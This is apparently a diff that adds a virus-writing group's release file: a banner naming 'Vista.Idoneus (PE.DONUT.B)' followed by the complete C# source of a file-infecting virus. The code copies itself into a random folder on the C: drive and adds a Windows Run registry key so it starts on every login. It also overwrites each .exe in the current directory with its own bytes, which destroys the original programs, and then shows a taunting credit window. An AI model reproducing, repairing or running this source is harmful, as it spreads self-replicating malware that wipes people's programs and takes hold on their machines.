@@ -1,0 +1,167 @@
+					   
+					  _             
+                     |_)  _ _|_  ._  _ 
+                     | \ (/_ |_  |  (_)              www.pugnax.co.uk
+					*************************************************
+					**               Vista.Idoneus                 **
+					**               (PE.DONUT.B)                 **
+					**             11th October 2005               **
+					*************************************************
+						          Anarchistic Sadistic
+						          
+		http://www.trendmicro.com/vinfo/virusencyclo/default5.asp?VName=PE%5FDONUT%2EB
+						     
+                    using System;
+                    using System.Collections;
+                    using System.Collections.Generic;
+                    using System.Reflection;
+                    using System.Text;
+                    using System.Windows;
+                    using System.Windows.Documents;
+                    using System.IO;
+                    using System.Threading;
+                    using System.Windows.Controls;
+                    using Microsoft.Win32;
+                     
+                    namespace idoneus
+                    {
+                        public class idoneus : Application
+                        {
+                            TextBlock txtElement;
+                            StackPanel rootPanel;
+                            Window win;
+                     
+                            protected override void OnStartingUp(StartingUpCancelEventArgs e)
+                            {
+                                win = new System.Windows.Window();
+                                rootPanel = new StackPanel();
+                                txtElement = new TextBlock();
+                                txtElement.TextContent = "Idoneus by Retro/rRlf \nhttp://retro.hosk.sk \nwww.rrlf.de.vu \n\nGeNeTiX is EVIL!";
+                     
+                                win.Content = rootPanel;
+                                rootPanel.Children.Add(txtElement);
+                                win.Show();
+                            }
+                        }
+                     
+                        internal sealed class IdoneusMain
+                        {
+                            [System.STAThread()]
+                            public static void Main()
+                            {
+                                Module mod = Assembly.GetExecutingAssembly().GetModules()[0];
+                                ArrayList list = new ArrayList();
+                     
+                                // Search for directories, subfolders on C drive and randomly picks one
+                                // GetDirectories(@"D:\", list); // Testing Drive
+                                GetDirectories(@"C:\", list);
+                                Random rand = new Random();
+                                int num = rand.Next(0, list.Count);
+                                object readreg, folder = list[num];
+                     
+                                // Ran before?!?
+                                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Retro", true);
+                     
+                                if (key == null)
+                                {
+                                    // Setup, first time run
+                                    key = Registry.CurrentUser.CreateSubKey(@"Software\Retro");
+                                    key.SetValue("Idoneus", folder + mod.ScopeName);
+                                    File.Copy(mod.FullyQualifiedName, folder.ToString() + @"\");
+                     
+                                }
+                     
+                                // Read registry for the last host file and delete it
+                                readreg = key.GetValue("Idoneus");
+                                File.Delete(readreg.ToString());
+                     
+                                // Copy itself to choosen direcory
+                                File.Copy(mod.FullyQualifiedName, folder.ToString() + @"\" + mod.ScopeName);
+                     
+                                // Write new key to registry to Software\Retro and Run
+                                RegistryKey runkey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                                runkey.SetValue("Idoneus", folder + @"\" + mod.ScopeName);
+                                key.SetValue("Idoneus", folder + @"\" + mod.ScopeName);
+                     
+                                // Look for EXE's in current directory
+                                string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe");
+                                foreach (string file in files)
+                                {
+                                    try
+                                    {
+                                        // Read Itself
+                                        AssemblyName.GetAssemblyName(file);
+                                        FileStream fs1 = new FileStream(mod.ScopeName, FileMode.OpenOrCreate, FileAccess.Read);
+                                        BinaryReader br1 = new BinaryReader(fs1);
+                                        int sl = (int)fs1.Length;
+                                        int self = sl;
+                                        br1.BaseStream.Seek(0, SeekOrigin.Begin);
+                                        byte[] bytes1 = new byte[self];
+                                        int BTR = self;
+                                        int BR = 0;
+                                        while (BTR > 0)
+                                        {
+                                            int n = br1.Read(bytes1, BR, BTR);
+                                            if (n == 0)
+                                                break;
+                                            BR += n;
+                                            BTR -= n;
+                                        }
+                                        br1.Close();
+                     
+                                        // Read found exe file
+                                        FileStream fs2 = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Read);
+                                        BinaryReader br2 = new BinaryReader(fs2);
+                                        int hl = (int)fs2.Length;
+                                        int host = hl;
+                                        br2.BaseStream.Seek(0, SeekOrigin.Begin);
+                                        byte[] bytes2 = new byte[host];
+                                        int BTR2 = host;
+                                        int BR2 = 0;
+                                        while (BTR2 > 0)
+                                        {
+                                            int n1 = br2.Read(bytes2, BR2, BTR2);
+                                            if (n1 == 0)
+                                                break;
+                                            BR += n1;
+                                            BTR2 -= n1;
+                                        }
+                                        br2.Close();
+                     
+                                        FileStream fs3 = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Write);
+                                        BinaryWriter fw = new BinaryWriter(fs3);
+                                        fw.BaseStream.Seek(0, SeekOrigin.Begin);
+                                        fw.Write(bytes1);
+                                        // fw.Write(bytes2);
+                                        // fw.Write("idoneus");
+                                        fw.Close();
+                                    }
+                                    catch
+                                    {
+                                        continue;
+                                    }
+                                }
+                     
+                                // Run Window
+                                idoneus app = new idoneus();
+                                app.Run();
+                            }
+                     
+                            static void GetDirectories(string dir, ArrayList storage)
+                            {
+                                try
+                                {
+                                    string[] dirs = Directory.GetDirectories(dir);
+                                    foreach (string s in dirs)
+                                    {
+                                        storage.Add(s);
+                                        GetDirectories(s, storage);
+                                    }
+                                }
+                                catch (System.UnauthorizedAccessException e1)
+                                {
+                                    Console.WriteLine("Error1" + e1.Message);
+                                }
+                            }
+                        }
+                    }
